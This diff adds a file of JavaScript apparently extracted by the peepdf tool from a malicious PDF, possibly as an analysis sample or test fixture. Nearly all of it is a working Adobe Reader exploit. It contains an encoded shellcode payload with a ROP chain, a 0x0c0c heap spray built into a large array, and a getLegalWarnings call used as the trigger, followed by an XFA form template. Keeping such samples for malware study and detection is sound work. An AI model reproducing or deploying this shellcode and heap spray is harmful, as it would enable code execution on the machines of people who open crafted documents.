@@ -1,0 +1,23 @@
+// peepdf comment: Javascript code located in object 1 (version 0)
+
+// comment
+var shellcode = unescape("%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%u22c8%u4a85%u0000%u1000%u0000%u0000%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9030%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0022%u0000%u0000%u0000%u0000%u0000%u0000%u0001%u63a5%u4a80%u0004%u4a8a%u2196%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0030%u0000%ua8a6%u4a80%u1f90%u4a80%u0004%u4a8a%ua7d8%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0020%u0000%ua8a6%u4a80%u63a5%u4a80%u1064%u4a80%uaedc%u4a80%u1f90%u4a80%u0034%u0000%ud585%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u000a%u0000%ua8a6%u4a80%u1f90%u4a80%u9170%u4a84%ub692%u4a80%uffff%uffff%uffff%uffff%uffff%uffff%u1000%u0000%ud3db%u0cba%ueee9%ud91e%u2474%u5ef4%uc929%u5db1%uee83%u31fc%u1456%u5603%u0b18%ue21b%u49c8%u1be4%u2e08%ufe6c%u6e39%u8a0a%u5e69%ude58%u1585%ucb0c%u5b1e%ufc99%ud697%u33ff%u4a28%u52c3%u91aa%ub510%u5993%ub465%u84d4%ue484%uc38d%u193b%u9eba%u9287%u0ff0%u4780%u3140%ud9a1%u68db%udb61%u0108%uc328%u2c4d%u78e2%udaa5%ua8f5%u23f4%u9559%ud639%ud1a3%u09fd%u2bd6%ub4fe%uefe1%u637d%uf467%ue025%ud0df%u25d4%u93b9%u82da%ufccd%u15fe%u7701%u9efa%u58a4%ue58b%u7c82%ubed0%u25ab%u11bc%u36d3%ucd1f%u3c71%u1a8d%u1f08%uefd9%ua021%u7819%ud331%u272b%u7be9%ua007%u7b37%u9b68%u1380%u2497%u3af1%u7053%u54a1%uf972%ua52a%u2c7b%uf5fc%u9fd3%ua5bd%u4f93%uac56%uaf1c%ucf46%ud8f7%u296f%ue6f7%u2e6f%u8a92%ucd06%u3c35%u62ac%ua7b3%ue429%u4155%u92c5%ubfc8%u3a59%ub478%ubce0%u9d14%u893b%u2264%u7aee%uc124%u777b%u91f4%u8779%u31f4%u61f7%ua19e%u3951%u5b36%ub1f8%ua4a7%ubfd6%u2fe7%u40d3%uc7a9%u5296%ub9dd%uab58%u501d%uc159%uf219%u7d0e%u2323%u2278%u06dc%u25fa%ud722%u5ecb%u4d14%u0974%u8158%uc974%ucb0e%ua174%uaff6%ud426%u65f9%u455b%u866f%u390a%uee38%u64b0%ub10e%u434b%ub60d%u11b4%u1f33%ue9dd%u9f73%u801d%ucf73%u5f75%ue05c%ua0b5%ua977%u2bdd%u1b19%u2b7f%ufd30%u2c21%u26b6%u8937%ud939%u2f38%u0f06%u4501%u934f%u5636%ub6fa%ufd1f%ue404%ud460");
+var c = unescape("%" + "u" + "0" + "c" + "0" + "c" + "%u" + "0" + "c" + "0" + "c");
+while (c.length + 20 + 8 < 0x10000) c += c;
+b = c.substring(0, (0x0c0c - 0x24) / 2);
+b += shellcode;
+b += c;
+d = b.substring(0, 0x10000 / 2);
+while (d.length < 0x80000) d += d;
+var_3 = d.substring(0, 0x80000 - (0x1020 - 0x08) / 2);
+var var_4 = new Array();
+for (i = 0; i < 0x1f0; i++) var_4[i] = var_3 + "s";
+this.getLegalWarnings(true);
+
+// peepdf comment: Javascript code located in object 9 (version 0)
+
+<? xml version = '1.0' ?> < xdp: xdp xmlns: xdp = 'http://ns.adobe.com/xdp/' > < config xmlns: xfa = 'http://www.xfa.org/schema/xci/3.0/' > < present > < pdf > < interactive > 1 < /interactive></pdf > < /present></config > < template xmlns: xfa = 'http://www.xfa.org/schema/xfa-template/3.0/' > < subform layout = 'tb'
+name = 'form1' > < pageSet / > < event activity = 'initialize'
+name = 'event__ready' > < script contentType = 'application/x-formcalc' > < /script></event > < subform > < field name = 'Button1' > < ui > < button highlight = 'inverted' / > < /ui><caption><value><text>Send!</text > < /value><para hAlign='center' vAlign='middle'/ > < /caption><bind match='none'/ > < event activity = 'click'
+name = 'event__click' > < script contentType = 'application/x-formcalc' > < /script></event > < /field><field name='TextField1'><ui><textEdit><border><edge stroke='lowered'/ > < /border></textEdit > < /ui></field > < /subform></subform > < /template><xfa:datasets xmlns:xfa='http:/ / www.xfa.org / schema / xfa - data / 1.0 / '><xfa:data><form1><TextField1>$host.messageBox("Greetings from Mars!")</TextField1></form1></xfa:data></xfa:datasets></xdp:xdp>
+
